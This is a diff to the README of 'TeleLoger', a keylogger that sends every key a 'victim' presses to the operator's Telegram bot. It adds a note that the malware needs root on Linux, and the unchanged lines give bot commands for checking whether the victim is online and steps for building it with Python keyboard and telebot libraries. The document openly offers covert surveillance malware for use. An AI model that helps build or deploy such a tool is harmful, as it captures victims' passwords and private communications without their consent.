@@ -15,6 +15,8 @@ TeleLoger - KeyLoger which send all keys which be pressed in you tg bot
 * Write /check to bot to know are online your victim
 * If victim in online, bot will send you all keys pressed your victim
 
+P.S Linux: malware work only if run in root
+
 # How to compile
 * Install python3 and pip
 * Install 'keyboard' and 'telebot' pylib
